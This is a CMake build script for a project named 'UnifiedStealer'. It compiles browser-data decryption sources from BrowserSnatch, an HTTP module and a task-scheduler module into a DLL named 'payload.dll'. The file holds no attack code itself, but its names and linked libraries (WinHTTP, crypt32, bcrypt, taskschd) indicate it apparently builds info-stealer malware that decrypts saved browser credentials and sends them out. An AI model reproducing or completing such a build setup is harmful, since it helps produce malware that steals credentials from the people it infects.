cmake_minimum_required(VERSION 3.20)
project(UnifiedStealer LANGUAGES CXX C)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# NOTE: This standalone CMakeLists is deprecated.
# Build via the parent stealer/CMakeLists.txt instead,
# which uses local .deps/ (no FetchContent).
message(WARNING "Use stealer/CMakeLists.txt for building, not this file.")

# ---- BrowserSnatch source location ----
set(BS_DIR "${CMAKE_CURRENT_SOURCE_DIR}/../BrowserSnatch/BrowserSnatch")

set(BS_SOURCES
    ${BS_DIR}/Helper.cpp
    ${BS_DIR}/ChromiumDecryptor.cpp
    ${BS_DIR}/AppBoundDecryptor.cpp
    ${BS_DIR}/ChromiumParser.cpp
    ${BS_DIR}/DataDump.cpp
    ${BS_DIR}/GeckoDecryptor.cpp
    ${BS_DIR}/GeckoParser.cpp
    ${BS_DIR}/TaskService.cpp
)

# ---- DLL Target ----
add_library(UnifiedStealer SHARED
    dllmain.cpp
    http.cpp
    ${BS_SOURCES}
)

target_include_directories(UnifiedStealer PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}
    ${BS_DIR}
    ${BS_DIR}/includes
)

# Skip our precompiled header for BrowserSnatch sources (they use their own Imports.h)
set_source_files_properties(${BS_SOURCES} PROPERTIES SKIP_PRECOMPILE_HEADERS ON)

# Precompiled header for our files
target_precompile_headers(UnifiedStealer PRIVATE pch.hpp)

# Link dependencies
target_link_libraries(UnifiedStealer PRIVATE
    nlohmann_json::nlohmann_json
    sqlite3
    pugixml
    bcrypt
    crypt32
    winhttp
    ws2_32
    shell32
    advapi32
    iphlpapi
    shlwapi
    ntdll
    ole32
    oleaut32
    taskschd
    Wtsapi32
)

# MSVC-specific flags
if(MSVC)
    target_compile_options(UnifiedStealer PRIVATE /W3 /utf-8)
    target_compile_definitions(UnifiedStealer PRIVATE
        _CRT_SECURE_NO_WARNINGS
        _SILENCE_ALL_CXX17_DEPRECATION_WARNINGS
    )
    target_link_options(UnifiedStealer PRIVATE /OPT:REF /OPT:ICF)
endif()

# Output name
set_target_properties(UnifiedStealer PROPERTIES
    OUTPUT_NAME "payload"
    SUFFIX ".dll"
    RUNTIME_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/out"
    LIBRARY_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}/out"
)
